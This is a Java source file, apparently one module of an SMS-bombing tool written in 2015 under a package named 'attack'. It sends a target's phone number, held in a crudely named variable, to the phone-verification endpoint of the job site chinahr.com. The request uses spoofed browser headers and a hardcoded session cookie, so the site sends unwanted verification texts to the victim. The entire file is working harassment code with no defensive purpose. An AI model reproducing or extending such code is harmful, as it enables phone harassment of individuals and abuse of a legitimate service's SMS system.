package com.utils.attack;

import org.apache.http.HttpEntity;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by fz on 2015/8/23.
 */
public class ZhongHuaYingCaiBomber implements MessageBomber{

    public String name;

    public ZhongHuaYingCaiBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        HttpPost httpPost = new HttpPost("http://www.chinahr.com/modules/jsperson/reg.php?action=phoneCaptch");

        List<NameValuePair> pairs = new ArrayList<NameValuePair>();
        pairs.add(new BasicNameValuePair("mobile", fuckNo));

        UrlEncodedFormEntity uefEntity = new UrlEncodedFormEntity(pairs, "utf-8");

        httpPost.setHeader(new BasicHeader("Accept", "text/plain, */*; q=0.01"));
        httpPost.setHeader(new BasicHeader("Accept-Encoding", "gzip, deflate"));
        httpPost.setHeader(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2"));
        httpPost.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded"));
        httpPost.setHeader(new BasicHeader("DNT", "1"));
        httpPost.setHeader(new BasicHeader("Host", "www.chinahr.com"));
        httpPost.setHeader(new BasicHeader("Origin", "http://www.chinahr.com"));
        httpPost.setHeader(new BasicHeader("Referer", "http://www.chinahr.com/"));
        httpPost.setHeader(new BasicHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"));
        httpPost.setHeader(new BasicHeader("X-Requested-With", "XMLHttpRequest"));
        httpPost.setHeader(new BasicHeader("Cookie", "_ga=GA1.2.455789517.1440341284; _gat=1; ipgoto_fixurl=http%3A//www.chinahr.com/; currentCityId=; __utmt=1; __utma=162484963.455789517.1440341284.1440341284.1440341284.1; __utmb=162484963.1.10.1440341284; __utmc=162484963; __utmz=162484963.1440341284.1.1.utmcsr=baidu|utmccn=(organic)|utmcmd=organic; PHPSESSID=e1i9m60b3ur4b08mbkdfp3ga02; regPhoneCode=64cd34f157592c400675246c1f934f5f"));

        httpPost.setEntity(uefEntity);

        CloseableHttpResponse httpResponse = httpClient.execute(httpPost);
        String result = null;
        try{
            HttpEntity entity = httpResponse.getEntity();
            if(httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK){
                if (entity != null){
                    result = EntityUtils.toString(entity, "utf-8");
                }
                EntityUtils.consume(entity);
            }
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            httpResponse.close();
        }
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
